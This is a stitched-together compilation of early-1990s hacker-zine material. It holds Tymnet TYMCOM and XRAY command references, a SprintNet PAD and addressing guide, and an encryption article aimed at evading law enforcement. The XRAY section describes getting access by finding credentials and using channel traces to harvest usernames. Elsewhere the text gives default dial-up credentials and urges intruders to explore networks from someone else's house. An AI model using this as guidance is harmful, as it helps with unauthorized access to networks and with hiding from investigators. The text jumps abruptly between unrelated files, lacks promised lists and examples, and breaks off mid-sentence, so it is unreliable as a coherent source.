Command         Description
-------         -----------
GRAB TOMxxxx    This should be the FIRST thing you do when down/upping
                a host.  Gets license for up or down host, then prompts for
                password of host.  Where 'xxxx' is the host number.  You
                must have privileged status to use.

CHANGE xxxx     Change a host number to 'xxxx'.

DIAGNOSTICS     Turns the diagnostic messages off or on.(Toggle)
DOWN P xx       Take DOWN port number 'xx', or
     H xxxx     Take DOWN host number 'xxxx'.

ENQUIRE         Lists information about the node and slow where TYMCOM is
                running.
EXIT            Logout.

MESSAGE         Sets text to be output to the terminal when a user logs in.

SHUT H xxxx     Disallow new logins to a specified host = 'xxxx', or
     P xx       Disallow new logins to a specified port = 'xx'.
SPEED xxxx      Specifies the baud rate at which a port will communicate.
STAT P xx-yy    Shows status of port numbers 'xx' through 'yy'.  Either
                one or a number of ports may be specified.

TIME            Displays the current time.
TO x message    Sends 'message' to specified user number 'x'.

UP P xx         Bring UP port number 'xx', or
   H xxxx       Bring UP host number 'xxxx'.

WHO             Lists user numbers of all users currently logged into TOM.


XRAY
----

   XRAY is another one of the very well known commands.  XRAY is a program
which sits within node code and waits for use.  Its used to gain
information about a specific node's configuration and its current status in
the network.  It can be used to determine the probable reason for a crash
or line outage in order to isolate bottlenecks or track down network
anomalies.

   XRAY user licenses are all assigned a logon priority.  If every XRAY
port on a node are in use, and a higher priority XRAY username logs in,
the lowest priority username will be logged out.

License Description
------- -----------
2       Permits the writing and running of disruptive node tests.
1       Permits the running of non-disruptive node tests.
0       Permits view only commands.

   The following list is a compilation of some hardcoded 'good-guys'.

   What follows is a VERY brief command summary.

Command         Description
-------         -----------
CD              Displays current auto/display mode for CRYPTO messages.
CD Y|N          Turns ON/OFF automatic display of CRYPTO messages.
CL n            Display the last 'n' CRYPTO messages.
CRTL Z          Logout.

BT              Causes the SOLO machine to go into boot.  Audited command.

DB              Used to build and measure link delay circuits between
                nodes.  The DB command prompts for a node list. IE-
                NODE LIST: <node #1 node#2 ... node#x>
DD              Displays link measurement data for circuit built by the
                DB command.  Verifies that the circuit has been built.
DE              Used to terminate the DB command.

HT              Puts the node code into a STOP state.  This command shows
                up in audit logs.

KD n            Display link descriptor parameters where 'n' is the
                neighbor number.
KS n            Display link performance statistics (link delay, packet-
                making, bandwidth utilization, etc.)

ND              Displays information about the configuration of a node
                and its neighbors.
NS option       Displays parameters for estimating node work load. Options:
                -EXCT is the current load factor or execute count. A count
                of less than 60 means the load is heavy.
                -EXLW is the lowest EXCT value computed since startup.
                -EXHW is the highest EXCT value computed.
SN              Restarts the node, command audited.

   I hope this file gave you a better understanding of the Tymnet network.
While a lot of the commands make sense only if you've had prior Tymnet
experience, I hope my summaries of each tool gave you a little better
understanding of the network.  I am available for questions/comments/gripes
on IRC, or I can be reached via Internet mail at:

                    pfalken@mindvox.phantom.com

   Thanks goes out to an anonymous hippy for providing the extra nudge I needed
to sit down and write this phile.  NO thanks goes out to my lousy ex-roommates
who kicked me out in the middle of this article.  Their day is approaching.

   Be careful everyone...and remember, if you have to explore the
mysterious fone/computer networks, do it from someone else's house.

          Volume Four, Issue Forty-Two, File 6 of 14
          
 
                   A User's Guide to XRAY

                         By  N.O.D.


This file was made possible by a grant from a local
McDonnell Douglas Field Service Office quite some 'tyme'
ago.  This was originally written about version 4, although
we are pretty sure that BT has now souped things up to version 6.
Everything still seems the same with the exception of a few
commands, one of which we will point out in particular.

Any comments/corrections/additions/updates or subpoenas
can be relayed to us through this magazine.

XRAY is a monitoring utility that gives the user a real-time
window into a Tymnet-II node.  Used in tandem with other
utilities, XRAY can be a very powerful tool in monitoring network
activity.

In this file we will discuss key features of XRAY and give command
formats for several commands.  Some commands are omitted from this
file since they can only be used from dedicated terminals.  Several
others are likewise omitted since they deal with the utilization of
XRAY in network configuration and debugging the actual node code, and
would probably be more damaging than useful, and commands to reset
circuits and ports are similarly missing.


ACCESS

The most obvious way to access XRAY is to find the username/password
pair that either corresponds to the host number of an XRAY port, or
is otherwise in the goodguy list of a particular node.

XRAY can also be accessed through the DDT utility by typing

    ?STAT

Either will respond with the following

**X-RAY**  NODE:  XXX   HOST:  ZZZ  TIME:  DD:HH:MM:SS

If all ports are currently in use the user will only be allowed access
if his/her is of greater precedence in the goodguy list than that of
someone previously online.  In such a case, that user will be forcibly
logged out and will receive the following message:

    "xray slot overridden"

Otherwise the user will see:

    "out of xray slots"

XRAY users are limited in their power by the associated "licence" level
given them in the XRAY goodguy list.  The levels are:

    0 - normal
    1 - privileged
    2 - super-privileged


There are several user names associated with the
XRAY utility.  These exist on almost any network utilizing
the Tymnet-II style networking platform.

COMMANDS  with parameters in <brackets>

HE  Help

    Use this command to display the commands available for that
    particular node.

GP  Get power <security string>

    This command allows the user to move up to the maximum security
    level allowed by his username, as specified in the good guy
    list.

XG  Display and/or modify XRAY goodguy list <entry number> <P/M>

    This command without parameters will display the XRAY goodguy
    list.  When added with an entry number and 'P' (purge) or
    'M' (modify), the user can edit the contents of the table.
    The XGI command will allow the user to enter a new entry
    into the list.  Any use of XG or XGI to alter the list is
    a super-privileged command and is audited.

    This command when entered without any parameters displays the
    "bad guy" list.  When used with a node number and 'R' it will remove
    that node from the list, and 'I' will included.  The 'R' and 'I'
    features are privileged commands and usage is noted in audit trails.

HS  Display host information



ND  Display node descriptor

    This command displays information about the node and its network
    links.

NS  Display node statistics

    This command displays various statistics about the node including
    time differentiations in packet loops, which can then be used to
    determine the current job load on that particular node.

KD  Display link descriptor <linked node>

    This command displays the values of the link to the node specified.
    This is displayed with columns relating to type of node (TP), speed
    of the link (SP), number of channels on the link (NCHN), etc..

KS  Display link statistics <up to 8 node numbers>

    This command provides a report on various factors on the integrity
    of the link to the given node(s), such as bandwidth usage, packet
    overhead, characters/second transmitted, delays in milliseconds, etc.

BZ  "Zap" link to node <node number>

    This command will cause the link to the specified node to be
    reset.  This command is privileged and is audited.  If the node
    "zapped" is not currently linked a "??" error message will be
    displayed.

TL  Set/Reset trace on link  <node number>
TN  Set/Reset trace on line  <node number>
TM  Display trace events     <B(ackground) / F(oreground)>

    These commands are used to display activity between two active
    nodes.


AC  Display active channels <starting channel> <range of channels>

    This command will display all active channel numbers for the given
    range starting at the given channel number.  Range is in hex.

QC  Query channel status <channel number>

    This command displays information about the given channel,
    including throughput speed, source and output buffer size and
    address location.


TC  Enable/disable data trace on channel <channel number> <0/1>

    This command with no arguments displays the channels
    that are being diagnosed by the trace.  The command with
    a channel number and a '1' will enable data trace for that
    channel, and a '0' will disable trace on that channel.  Enabling
    or disabling trace is a privileged command.

TD  Display channel trace data in hex  <count> <I/O>
TE  Display channel trace data in hex including escapes <count> <I/O>
TA  Display channel trace data as ASCII  <count> <I/O>

    With these commands trace data is displayed for a specified
    time count.  A prefixed 'I' or 'O' will show input or output
    data.  The default is both.

    >ta 5

    I/O   CHN   TIME

**Note:  Although this will allow one to follow the network connections
         on specific channels, password data is filtered out.  As you
         can see from the above example, usernames are not.  Many
         usernames do not have passwords, as you all know.  **

On more recent versions of XRAY a similar command "DR" performs a
similar function to the trace commands, but shows both hex and
ascii of the data in memory registers of the node.

BS  Display bufferlet use statistics

    This command shows the current and past usage of the memory
    allocated to data buffering.  This shows total usage, total peak
    usage, and available buffer size.

RB  Read buffer <buffer index>

    This command displays the entire contents of the given buffer.
    This is a privileged command and its use is not primarily for user
    circuits.  Primarily.

    >RB 69

    50 61 72 74 79 20 6F 6E 20 64 75 64 65 21 21 21

WB  Write buffer <buffer index>

    This command writes up to seven bytes into the specified buffer.
    The buffer must greater than 4.  This is also a privileged command.

CD  Set/reset CRYPTO auto display mode <Y/N>
CL  Display CRYPTO log <number of minutes>
CM  Display CRYPTO messages by type
SM  Enable/Disable CRYPTO messages by type

    CRYPTO messages are informational messages about the activity of
    the node.  Up to 256 such entries are stored in a circular buffer
    to record this activity.  You can turn on automatic reporting
    of these messages with the CD command prefixed with a 'Y' for
    on and 'N' for off.  Certain message types that become bothersome
    can be disabled with the SM command and the message type.

DB  Begin delay measurement
DD  Display delay measurement statistics
DE  Terminate delay measurement
DL  Begin data loopback circuit

    These commands are used to build circuits for testing the speed and
    integrity of data flow between two nodes.  The DL command is
    super privileged and only one such circuit can be built on
    a node at a given time.  The data traffic generated by the DL is for
    diagnostic use only and can be monitored by viewing node and link
    statistics.

PM  Measure performance on a channel <channel number>

    This command measures the performance of a given channel by
    inserting a timing sequence into the packet stream.  Once it has
    reached the given channel it is returned and a value corresponding
    to the total time elapsed in milliseconds is displayed.  If the
    channel is not active, or no response is returned in 8 seconds the
    message "BAD CHANNEL OR TIMEOUT" is displayed.

LE  Set local echo mode
RE  Set remote echo mode

    One would use the set local echo command if the XRAY terminal
    is not echoing commands typed by the user.  By default, XRAY does
    not echo output.


SUMMARY

    XRAY is pretty confusing.  Be careful with what you are doing
    since you are essentially prodding around in the memory of the
    node.  Think of it in terms of using a utility to poke and prod
    the memory of your own computer.  Think of how disastrous a
    command written to the wrong portion of memory can be.  Don't
    do anything stupid, or you might bring down a whole network,
    or at minimum lose your access.

    IF DSR AND TXC, THEN USE EXTERNAL CLOCKING.  IF DSR AND NO TXC,
THEN USE INTERNAL CLOCKING DERIVED FROM THE CONFIGURED LINE SPEED
PRODUCED FROM A CTC CHIP).  IF THE CLOCKING IS PRODUCED INTERNALLY,
THEN THE INTERNAL CLOCK IS ALSO PROVIDED ON PINS 11 AND 24
AT THE REAR PANEL.

    FOR THE TP3325, THE NETLINES ALWAYS USE THE EXTERNAL CLOCK SOURCE.
THE HARDWARE WAS CHANGED DURING REFINEMENT OF THE MOD ONE XPB.

    IF THE ATTACHED DEVICE IS PROVIDING CLOCKING AND THE TP3025 IS PROVIDING
CLOCKING, THE TP WILL DETECT THE CLOCKING AND WILL STOP CLOCKING. IN THE
CASE OF THE TP3025 HAVING BEEN RESET AND LOADED, IF A TP3005/3006 IS THEN
CONNECTED TO THE INTERFACE, THERE IS A RACE CONDITION WHERE THE DEVICE THAT
PROVIDES THE CLOCKING IS ARBITRARY.  THE HARDWARE LOGIC REQUIRES A RESET
TO OCCUR FOR THE TP3025 TO CHANGE PRIOR SELECTION OF 1) INTERNAL/EXTERNAL
CLOCKING AND 2) V35/RS232 INTERFACE AFTER A LOAD.

    THE DEBUG PORT "S" COMMAND WILL RETURN ONE HEX BYTE THAT REPRESENTS
THE DATA SET SIGNALS STATUS AT THE SIO CHIP FOR THE DEFINED LINE
(E.G. "S2" WILL RETURN THE DATA SET SIGNALS ON LINE 2).  THE UPPER HALF
OF THE BYTE IS USED TO REPRESENT THE DATA SET SIGNAL STATUS.

    WITH DTR TRUE ( PIN 20), RXC (PIN 11) IS CHECKED FOR AN INBOUND CLOCK
SIGNAL.  IF THERE IS A CLOCK SIGNAL, THEN THE SIO IS CLOCKED EXTERNALLY
FROM PIN 11 AND 24.  IF THERE IS NO CLOCK ON PIN 11 THEN AN INTERNAL CLOCK
SOURCE IS GATED TO THE SIO AND TO PIN 15 AND 17 ON THE REAR PANEL INTERFACE.

     THE OUTPUT OF THE DEBUG PORT 'S' COMMAND DISPLAYS ONE HEX BYTE THAT
IS A COMPOSITE OF THE DATA SET SIGNALS FROM THE PIO AND SIO CHIPS.  THE
OUTPUT BIT DEFINITIONS ARE THE SAME AS THE X.25 LINE BUT A NOTE NEEDS
TO MADE THAT THE X.25 IS A DTE INTERFACE AND THE DEVICE LINES ARE A
DCE INTERFACE.  THE UTILIZATION OF THE INBOUND RTS/CTS MAY NOT BE
REQUIRED FOR THE TP TO MAINTAIN THE INTERFACE.

    PINS 22 AND 25 ARE PAD DEPENDANT SO THEY MAY BE USED FOR
DIFFERENT FUNCTIONS THAN THOSE EXPECTED.

                   ALL NUMERIC VALUES ARE IN HEX.
                   COMMAND STRINGS CAN BE USED WHILE IN THE DEBUG PORT.

How to Access SprintNet:
~~~~~~~~~~~~~~~~~~~~~~~~
(Compliments of Sprint)
 
 
                         SPRINTNET LOCAL ACCESS NUMBERS
 
     FOR THE MOST UP-TO-DATE LISTING OF THE U.S. ACCESS TELEPHONE NUMBERS
     FOR PC OUTDIAL SERVICES, DO THE FOLLOWING:
 
     1.  USE A MODEM TO DIAL 1-800-546-1000 WITH PARAMETERS SET AT 7-E-1

     2.  TYPE THREE CARRIAGE RETURNS (CR) (CR) (CR)

     3.  INPUT YOUR AREA CODE AND LOCAL EXCHANGE

     4.  YOU WILL THEN RECEIVE THE PROMPT  SIGN "@"

     5.  THEN, TYPE:
                    MAIL (CR)
                    USER NAME: PHONES (CR)
                    PASSWORD: PHONES  (CR)
 
Follow the menus to get your local dialup, then logon through that using the
same procedure until you get to the "@" prompt.  From here, you can type in
commands.  Below is a list of commands available from the "@" prompt.
 
Notes:  while connected, you can escape to the command prompt by sending
        <cr>@<cr>
        while waiting for a connection, you can escape to the command prompt by
        sending a hard BREAK
 
Command <parameter>  Explanation
 
BYE                  Closes session (same as disconnect)
CONNECT <nua>        Connects to a network user address
CONTINUE             Continue session (used after breaking)
DISCONNECT           Closes session (same as bye)
DTAPE                Builds optimum circuit for bulk file transfer
DISABLE ECHO
DISABLE FLOW         Pad to host flow control
DISABLE TFLOW        Terminal to pad flow control
ENABLE ECHO
ENABLE FLOW
ENABLE TFLOW
FULL                 Set full duplex
HALF                 Set half duplex
HANGUP               Self explanitory
ID <nui>             Sets the network user id for charged calls
RESET                Resets your port (as if you just dialed up)
RST                  Show remote parameters
RST?                 Set remote parameters
PAR?                 Show ITI parameters
STATUS               Shows your current network address and port
SET? <param>:<value> Set ITI parameters. 
TERM <termtype>      Set your termtype 
TEST CHAR            Test of all ascii characters
TEST ECHO            Echos what you type
TEST TRIANGLE        
TEST VERSION         Shows current pad software ver
 
Note:  I didn't include any of the parameters for SET? or termtypes because
       they would have increased the length of this file by about 20%.  If you
       want these, you can get them from the PC-PURSUIT BBS file section via
       C PURSUIT from SprintNet or 031109090063100 international.
 
 
 
Network Messages:
~~~~~~~~~~~~~~~~~
While attempting to CONNECT to addresses on SprintNet, you may run into various
messages from the network.  This should help you determine what they mean.
 
 
If you are connected and break your connection or are disconnected by the
remote host, you will recieve a disconnect message.  Below is a breakdown of
the message.
 
DISCONNECTED 00 00 00:00:00:00 000 00
             ^  ^  ^_________^  ^  ^
             |  |       |       |  |
             |  |       |       |  +-- Packets sent
             |  |       |       +----- Packets recieved
             |  |       +------------- Days:Hours:Minutes:Seconds connected
             |  +--------------------- Clearing diagnostic code
             +------------------------ Clearing cause code
   
 
If you are unable to make a connection or abort an attempted connection, you
will only receive cause and diagnostic codes (as no time was spent connected
and obviously no packets were sent!) along with a very general plain-text of
what the problem might be (i.e. rejecting, not operating...).  Below is a list
of cause and diagnostic codes to give you a more detailed idea of why you were
unable to connect or why you were disconnected.

 0   "DTE originated clear"
 1   "Number busy"

Note:  If you're getting LOCAL/REMOTE PROCEDURE ERROR or REJECTING, try using
       different ports with the same address.
 
 
Other Than SprintNet:
~~~~~~~~~~~~~~~~~~~~~
International or other than SprintNet users, follow the table below to expand
these addresses to suit your network:
 
      202  224      <--- Address from list  
 
 031102020022400    <--- Translated to international format      
 
 
03110 202 00224 00  <--- Explanation of international format  
^^^^^ ^^^ ^^^^^ ^^
  |    |    |    |
  |    |    |    |____ Port Number
  |    |    |_________ Network Address
  |    |______________ Network Prefix
  |___________________ DNIC
 
 
 
 DNIC  : This will be be 03110 for all translations.  On some networks, you
         won't need the leading 0 and can use 3110, and a few networks
         (DataPac?) use a 1 instead of 0, thus:  13110.
 
 
Prefix : Throughout this file, it will always be a three digit prefix.
         
 
Address: You may have to experiment a little to get the correct place holders,
         but as a general rule they will translate like this:

             1  = 00001
            11  = 00011
           111  = 00111
          1111  = 01111          
         11111  = 11111
         
 
Ports  : Port numbers range from .1 to .99.  The first 27 ports may be
         alternately displayed as A-Z.  Ports are generally not listed as most
         addresses will find a free port for you if you leave it off, but in
         some cases you must use it, so they translate like this:

         .1 or A = 01
         .2 or B = 02
         and so on...
 

 
Examples of translated addresses:
      
      201 1.5  = 031102010000105     
      415 9    = 031104150000900
      223 25   = 031102230002500
      714 218  = 031107140021800
      617 2027 = 031106170202700
 
 
If this seems a bit essoteric or confusing, don't worry.  A little bit of
experimenting will get you on the right track.
 
 
Notes: 
~~~~~~
- You can usually omit leading and trailing 0's 
- Most networks and PADs do NOT allow any spaces
- From SprintNet, you can use either form of address
 

 
Conventions in this list: 
~~~~~~~~~~~~~~~~~~~~~~~~~
Addresses followed by a "$" do not accept collect connections (if you're not
coming on from SprintNet, ignore the $).
 
Addresses followed by a "*" do not accept collect connections, and I was unable
to connect to them to determine what they are.
                                                                                
When both the OS and the RESPONSE fields are left blank, this means that I
connected and either couldn't evoke response or got a garbage response.

                        Written by The Racketeer of
                            The /-/ellfire Club


        The purpose of this file is to explain the why and the how of Data
Encryption, with a brief description of the future of computer security,
TEMPEST.

        At the time of this issue's release, two of the more modern software
packages use encryption methods covered in this article, so exercise some of
your neurons and check into newer releases if they are available.  Methods
described in this file use PGP, covering an implementation of Phil Zimmermann's
RSA variant, and the MDC and IDEA conventional encryption techniques by using
PGP and HPACK.

                              --------------------
                              WHY DATA ENCRYPTION?
                              --------------------

        This isn't exactly the typical topic discussed by me in Phrack.
However, the importance of knowing encryption is necessary when dealing with
any quasi-legal computer activity.  I was planning on starting my series on
hacking Novell Networks (so non-Internet users can have something to do), but
recent events have caused me to change my mind and, instead of showing people
how to get into more trouble (well, okay, there is plenty of that in this file
too, since you're going to be working with contraband software), I've opted
instead to show people how to protect themselves from the long arm of the Law.

        Why all this concern?

        Relatively recently, The Masters of Deception (MoD) were raided by
various federal agencies and were accused of several crimes.  The crimes they
did commit will doubtlessly cause more mandates, making the already
too-outrageous penalties even worse.

        "So?" you might ask.  The MoD weren't exactly friends of mine.  In fact,
quite the contrary.  But unlike many of the hackers whom I dealt with in the
"final days" prior to their arrest, I bitterly protested any action against the
MoD.  Admittedly, I followed the episode from the beginning to the end, and the
moral arguments were enough to rip the "Hacker World" to pieces.  But these
moral issues are done, the past behind most of us.  It is now time to examine
the aftermath of the bust.

        According to the officials in charge of the investigation against MoD
members, telephone taps were used to gain evidence against members
successfully.  All data going in and out of their house was monitored and all
voice communications were monitored, especially between members.

        So, how do you make a line secure?  The party line answer is use of
effective encryption methods.

        Federal investigative agencies are currently pushing for more
technological research into the issue of computer security.  All of the popular
techniques which are being used by hackers today are being used by the
government's R&D departments.

        Over the course of the last 5 years, I've watched as the U.S.
Government went from a task force of nearly nil all the way to a powerful
marauder.  Their mission?  Unclear.  Regardless, the research being
accomplished by federally-funded projects dealing with the issues of computer
security are escalating.  I've personally joined and examined many such
conferences and have carefully examined the issues.  Many of these issues will
become future Phrack articles which I'll write.  Others, such as limited-life
semiconductors and deliberate telephone line noise sabotage caused by ACK
packet detections in order to drive telecommunication costs higher, are sadly
unpreventable problems of the future which won't be cured by simple awareness
of the problem.

        They have different names -- Computer Emergency Response Team (CERT),
Computer Assisted Security Investigative Analysis Tool (FBI's CASIAT), the
Secret Service's Computer Fraud Division, or the National Computer Security
Center (NSA's NCSC).  Scores of other groups exist for every network, even
every operating system.  Their goal isn't necessarily to catch hackers; their
goal is to acquire information about the act of hacking itself until it is no
longer is a problem.  Encryption stands in the way.

        Computer Security is literally so VAST a concept that, once a person
awakens to low-level computer mechanics, it becomes nearly impossible to
prevent that person from gaining unauthorized access to machines.  This is
somewhat contradictory to the "it's all social engineering" concept which we
have been hearing about on Nightline and in the papers.  If you can't snag them
one way though, you can get them another -- the fact is that computers are
still too damn vulnerable these days to traditional hacking techniques.

        Because of the ease of breaking through security, it becomes very
difficult to actually create an effective way to protect yourself from any form
of computer hacking.  Look at piracy:  they've tried every trick in the book to
protect software and, so far, the only success they have had was writing
software that sucked so much nobody wanted a copy.

        Furthermore, totally non-CPU related attacks are taking place.  The
passing of Anti-TEMPEST Protection Laws which prevent homes from owning
computers that don't give off RF emissions has made it possible for any Joe
with a few semesters of electrical engineering knowledge to rig together a
device that can read what's on your computer monitor.

     Therefore:

     Q:  How does a person protect their own computer from getting hacked?

     A:  You pretty much can't.

        I've memorized so many ways to bypass computer security that I can
rattle them off in pyramid levels.  If a computer is not even connected to a
network or phone line, people can watch every keystroke typed and everything
displayed on the screen.

        Why aren't the Fedz using these techniques RIGHT NOW?

        I can't say they are not.  However, a little research into TEMPEST
technology resulted in a pretty blunt fact:

        There are too many computer components to scan accurately.  Not the
monitor, oh no!  You're pretty much fucked there.  But accessories for input
and output, such as printers, sound cards, scanners, disk drives, and so
forth...the possibility of parallel CPU TEMPEST technology exists, but there are
more CPU types than any mobile unit could possibly use accurately.

        Keyboards are currently manufactured by IBM, Compaq, Dell, Northgate,
Mitsuma (bleah), Fujitsu, Gateway, Focus, Chichony, Omni, Tandy, Apple, Sun,
Packard-Bell (may they rot in hell), Next, Prime, Digital, Unisys, Sony,
Hewlett-Packard, AT&T, and a scattering of hundreds of lesser companies.  Each
of these keyboards have custom models, programmable models, 100+ key and < 100
key models, different connectors, different interpreters, and different levels
of cable shielding.

        For the IBM compatible alone, patents are owned on multiple keyboard
pin connectors, such as those for OS/2 and Tandy, as well as the fact that the
ISA chipsets are nearly as diverse as the hundreds of manufacturers of
motherboards.  Because of lowest-bid practices, there can be no certainty of
any particular connection -- especially when you are trying to monitor a
computer you've never actually seen!

        In short -- it costs too much for the TEMPEST device to be mobile and
to be able to detect keystrokes from a "standard" keyboard, mostly because
keyboards aren't "standard" enough!  In fact, the only real standard which I
can tell exists on regular computers is the fact that monitors still use good
old CRT technology.

        Arguments against this include the fact that most of the available PC
computers use standard DIN connectors which means that MOST of the keyboards
could be examined.  Furthermore, these keyboards are traditionally serial
connections using highly vulnerable wire (see Appendix B).

        Once again, I raise the defense that keyboard cables are traditionally
the most heavily shielded (mine is nearly 1/4 inch thick) and therefore falls
back on the question of how accurate a TEMPEST device which is portable can be,
and if it is cost effective enough to use against hackers.  Further viewpoints
and TEMPEST overview can be seen in Appendix B.

        As a result, we have opened up the possibility for protection from
outside interference for our computer systems.  Because any DECENT encryption
program doesn't echo the password to your screen, a typical encryption program
could provide reasonable security to your machine.  How reasonable?

        If you have 9 pirated programs installed on your computer at a given
time and you were raided by some law enforcement holes, you would not be
labeled at a felon.  Instead, it wouldn't even be worth their time to even raid
you.  If you have 9 pirated programs installed on your computer, had 200
pirated programs encrypted in a disk box, and you were raided, you would have
to be charged with possession of 9 pirated programs (unless you did something
stupid, like write "Pirated Ultima" or something on the label).

        We all suspected encryption was the right thing to do, but what about
encryption itself?  How secure IS encryption?

        If you think that the world of the Hackers is deeply shrouded with
extreme prejudice, I bet you can't wait to talk with crypto-analysts.  These
people are traditionally the biggest bunch of holes I've ever laid eyes on.  In
their mind, people have been debating the concepts of encryption since the dawn
of time, and if you come up with a totally new method of data encryption, -YOU
ARE INSULTING EVERYONE WHO HAS EVER DONE ENCRYPTION-, mostly by saying "Oh, I
just came up with this idea for an encryption which might be the best one yet"
when people have dedicated all their lives to designing and breaking encryption
techniques -- so what makes you think you're so fucking bright?

        Anyway, crypto-(anal)ysts tend to take most comments as veiled insults,
and are easily terribly offended.  Well, make no mistake, if I wanted to insult
these people, I'd do it.  I've already done it.  I'll continue to do it.  And I
won't thinly veil it with good manners, either.

        The field of Crypto-analysis has traditionally had a mathematical
emphasis.  The Beal Cipher and the German Enigma Cipher are some of the more
popular views of the field.  Ever since World War 2, people have spent time
researching how technology was going to affect the future of data encryption.

        If the United States went to war with some other country, they'd have a
strong advantage if they knew the orders of the opposing side before they were
carried out.  Using spies and wire taps, they can gain encrypted data referred
to as Ciphertext.  They hand the information over to groups that deal with
encryption such as the NSA and the CIA, and they attempt to decode the
information before the encrypted information is too old to be of any use.

        The future of Computer Criminology rests in the same ways.  The
deadline on white collar crimes is defaulted to about 3-4 years, which is
called the Statute of Limitations.  Once a file is obtained which is encrypted,
it becomes a task to decrypt it within the statute's time.

        As most crypto-analysts would agree, the cost in man-hours as well as
supercomputer time would make it unfeasible to enforce brute force decryption
techniques of random encryption methods.  As a result of this, government
regulation stepped in.

        The National Security Agency (referred to as "Spooks" by the relatively
famous tormenter of KGB-paid-off hackers, Cliff Stoll, which is probably the
only thing he's ever said which makes me think he could be a real human being)
released the DES -- Data Encryption Standard.  This encryption method was
basically solid and took a long time to crack, which was also the Catch-22.

        DES wasn't uncrackable, it was just that it took "an unreasonable
length of time to crack."  The attack against the word "unreasonable" keeps
getting stronger and stronger.  While DES originated on Honeywell and DEC PDPs,
it was rumored that they'd networked enough computers together to break a
typical DES encrypted file.  Now that we have better computers and the cost
requirements for high-speed workstations are even less, I believe that even if
they overestimated "unreasonable" a hundredfold, they'd be in the "reasonable"
levels now.

To explain how fast DES runs these days...

        I personally wrote a password cracker for DES which was arguably the
very first true high-speed cracker.  It used the German "Ultra-Fast Crypt"
version of the DES algorithm, which happened to contain a static variable used
to hold part of the previous attempt at encrypting the password, called the
salt.  By making sure the system wouldn't resalt on every password attempt, I
was able to guess passwords out of a dictionary at the rate of 400+ words per
second on a 386-25 (other methods at that time were going at about 30 per
second).  As I understand it now, levels at 500+ for the same CPU have been
achieved.

        Now this means I can go through an entire dictionary in about five
minutes on a DES-encrypted segment.  The NSA has REAL cash and some of the
finest mathematicians in the world, so if they wanted to gain some really
decent speed on encryption, DES fits the ideal for parallel programming.
Splitting a DES segment across a hundred CPUs, each relatively modern, they
could crank out terraflops of speed.  They'd probably be able to crack the code
within a few days if they wanted to.

        Ten years from now, they could do it in a few seconds.

        Of course, the proper way to circumnavigate DES encryption is to locate
and discover a more reliable, less popular method.  Because the U.S. Government
regulates it, it doesn't mean it's the best.  In fact, it means it's the
fucking lamest thing they could sweeten up and hope the public swallows it!
The last attempt the NSA made at regulating a standard dealing with encryption,
they got roasted.

        I'm somewhat convinced that the NSA is against personal security, and
from all the press they give, they don't WANT anyone to have personal security.
Neither does the Media for that matter.

        Because of lamers in the "Biblical Injustice Grievance Group of
Opposing Terrible Sacrilege" (or BIGGOTS) who think that if you violate a LAW
you're going to Hell (see APPENDIX C for my viewpoint of these people) and who
will have convinced Congress to pass ease-of-use wire taps on telephone lines
and networks so that they can monitor casual connections without search
warrants, encryption will be mandatory if you want any privacy at all.

        And to quote Phil Zimmermann, "If privacy is outlawed, only the
outlaws will have privacy."

        Therefore, encryption methods that we must use should be gathered into
very solid categories which do NOT have endorsement of the NSA and also have
usefulness in technique.

HOW TO USE DECENT ENCRYPTION:

(First, go to APPENDIX D, and get yourself a copy of PGP, latest version.)

        First of all, PGP is contraband software, presumably illegal to use in
the United States because of a patent infringement it allegedly carries.  The
patent infringement is the usage of a variant of the RSA encryption algorithm.
Can you patent an algorithm?  By definition, you cannot patent an idea, just a
product -- like source code.  Yet, the patent exists to be true until proven
false.  More examples of how people in the crypto-analyst field can be assholes.

        Anyway, Phil's Pretty Good Software, creators of PGP, were sued and all
rights to PGP were forfeited in the United States of America.  Here comes the
violation of the SECOND law, illegal exportation of a data encryption outside
of the United States of America.  Phil distributed his encryption techniques
outside the USA, which is against the law as well.  Even though Mr. Zimmermann
doesn't do any work with PGP, because he freely gave his source code to others,
people in countries besides the United States are constantly updating and
improving the PGP package.

        PGP handles two very important methods of encryption -- conventional
and public key.  These are both very important to understand because they
protect against completely different things.

                            -----------------------
                            CONVENTIONAL ENCRYPTION
                            -----------------------

        Conventional encryption techniques are easiest to understand.  You
supply a password and the password you enter encrypts a file or some other sort
of data.  By re-entering the password, it allows you to recreate the original
data.

        Simple enough concept, just don't give the password to someone you
don't trust.  If you give the password to the wrong person, your whole business
is in jeopardy.  Of course, that goes with just about anything you consider
important.

        There are doubtlessly many "secure enough" ciphers which exist right
now.  Unfortunately, the availability of these methods are somewhat slim
because of exportation laws.  The "major" encryption programs which I believe
are worth talking about here are maintained by people foreign to the USA.

        The two methods of "conventional" encryption are at least not DES,
which qualifies them as okay in my book.  This doesn't mean they are impossible
to break, but they don't have certain DES limitations which I know exist, such
as 8 character password maximum.  The methods are:  MDC, as available in the
package HPACK; and IDEA, as available in Pretty Good Privacy.

        Once you've installed PGP, we can start by practicing encrypting
some typical files on your PC.  To conventionally encrypt your AUTOEXEC.BAT
file (it won't delete the file after encryption), use the following command:

C:> pgp -c autoexec.bat
Pretty Good Privacy 2.1 - Public-key encryption for the masses.
(c) 1990-1992 Philip Zimmermann, Phil's Pretty Good Software. 6 Dec 92
Date: 1993/01/19 03:06 GMT

You need a pass phrase to encrypt the file.
Enter pass phrase:                                      { Password not echoed }
Enter same pass phrase again: Just a moment....

        PGP will compress the file before encrypting it.  I'd say this is a
vulnerability to the encryption on the basis that the file contains a ZIP file
signature which could conceivably make the overall encryption less secure.
Although no reports have been made of someone breaking PGP this way, I'd feel
more comfortable with the ZIP features turned off.  This is somewhat contrary
to the fact that redundancy checking is another way of breaking ciphertext.
However, it isn't as reliable as checking a ZIP signature.

        Although PGP will doubtlessly become the more popular of the two
programs, HPACK's encryption "strength" is that by being less popular, it will
probably not be as heavily researched as PGP's methods will be.  Of course, by
following PGP, new methods of encryption will doubtlessly be added as the
program is improved.

        Here is how you'd go about encrypting an entire file using the HPACK
program using the MDC "conventional" encryption:

        Anyway, I don't personally think HPACK will ever become truly popular
for any reason besides its encryption capabilities.  ZIP has been ported to an
amazing number of platforms, in which lies ZIP's encryption weakness.  If you
think ZIP is safe, remember that you need to prevent the possibility of four
years of attempted password cracking in order to beat the Statutes of
Limitations:

        Here is the introduction to ZIPCRACK, and what it had to say about how
easy it is to break through this barrier:

(Taken from ZIPCRACK.DOC)
-----
     ZIPCRACK is a program designed to demonstrate how easy it is to find
passwords on files created with PKZIP.  The approach used is a fast,
brute-force attack, capable of scanning thousands of passwords per second
(5-6000 on an 80386-33).  While there is currently no known way to decrypt
PKZIP's files without first locating the correct password, the probability that
a particular ZIP's password can be found in a billion-word search (which takes
